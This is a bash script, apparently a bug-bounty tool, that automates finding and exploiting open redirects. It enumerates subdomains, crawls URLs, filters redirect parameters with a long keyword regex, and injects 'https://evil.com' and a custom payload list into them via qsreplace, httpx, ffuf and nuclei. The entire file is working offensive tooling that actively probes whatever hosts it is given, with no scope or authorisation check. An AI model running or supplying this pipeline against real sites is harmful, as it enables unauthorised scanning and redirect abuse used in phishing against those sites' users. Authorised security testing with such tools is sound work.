#!/bin/bash
# Open Redirect Scanner & Exploiter
# Usage: ./oredirect.sh hosts

set -euo pipefail

if [ $# -lt 1 ]; then
    echo "Usage: $0 hosts"
    exit 1
fi

HOSTS_FILE=$1
OUTDIR="oredirect_out"
PAYLOADS="/home/kali/hunt/loxs/payloads/or.txt"  # custom payload list

mkdir -p $OUTDIR

echo "[*] Starting Open Redirect Scanner..."
echo "[*] Reading hosts from $HOSTS_FILE"

### 1. Subdomain Enumeration ###
echo "[*] Enumerating subdomains..."
while read domain; do
    subfinder -d $domain -all -silent -o $OUTDIR/sub_$domain.txt || true
    assetfinder --subs-only $domain >> $OUTDIR/sub_$domain.txt || true
done < $HOSTS_FILE

sort -u $OUTDIR/sub_*.txt -o $OUTDIR/subdomains.txt

### 2. Probing alive hosts ###
echo "[*] Probing alive subdomains..."
cat $OUTDIR/subdomains.txt | httpx -silent -o $OUTDIR/alive.txt

### 3. Collecting URLs ###
echo "[*] Collecting URLs..."
cat $OUTDIR/alive.txt | gau > $OUTDIR/urls_gau.txt || true
cat $OUTDIR/alive.txt | katana -d 2 -silent > $OUTDIR/urls_katana.txt || true
cat $OUTDIR/alive.txt | urlfinder -silent > $OUTDIR/urls_urlfinder.txt || true
cat $OUTDIR/alive.txt | hakrawler -plain > $OUTDIR/urls_hakrawler.txt || true

cat $OUTDIR/urls_*.txt | uro | sort -u > $OUTDIR/final_urls.txt

### 4. Filter for open redirect parameters ###
echo "[*] Filtering redirect parameters..."
if command -v gf &>/dev/null; then
    cat $OUTDIR/final_urls.txt | gf redirect | uro | sort -u > $OUTDIR/redirect_params.txt
else
    cat $OUTDIR/final_urls.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" \
        | sort -u > $OUTDIR/redirect_params.txt
fi

### 5. Quick exploitation with evil.com ###
echo "[*] Testing basic payload (evil.com)..."
cat $OUTDIR/redirect_params.txt | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com" -o $OUTDIR/hits_basic.txt

### 6. Custom payload exploitation ###
if [ -f "$PAYLOADS" ]; then
    echo "[*] Testing with custom payload list ($PAYLOADS)..."
    while read url; do
        while read payload; do
            echo "$url" | qsreplace "$payload"
        done < "$PAYLOADS"
    done < $OUTDIR/redirect_params.txt | httpx -silent -fr -mr "google.com" -o $OUTDIR/hits_payloads.txt
else
    echo "[!] Custom payload list not found: $PAYLOADS"
fi

### 7. Optional Fuzzing with ffuf ###
if command -v ffuf &>/dev/null; then
    echo "[*] Running ffuf fuzzing..."
    ffuf -w $OUTDIR/redirect_params.txt:PARAM -w $PAYLOADS:PAYLOAD \
         -u "FUZZSITE?PARAM=PAYLOAD" \
         -mc 301,302,303,307,308 \
         -mr "google.com" -o $OUTDIR/ffuf_results.json || true
fi

### 8. Optional Nuclei scan ###
if command -v nuclei &>/dev/null; then
    echo "[*] Running nuclei openRedirect template..."
    cat $OUTDIR/subdomains.txt | nuclei -t /home/kali/hunt/nuclei-templates/openRedirect.yaml -c 30 -o $OUTDIR/nuclei_hits.txt || true
fi

echo "[*] Done. Results saved in $OUTDIR/"
echo " - Alive subdomains: $OUTDIR/alive.txt"
echo " - Collected URLs: $OUTDIR/final_urls.txt"
echo " - Redirect params: $OUTDIR/redirect_params.txt"
echo " - Basic hits: $OUTDIR/hits_basic.txt"
echo " - Payload hits: $OUTDIR/hits_payloads.txt"
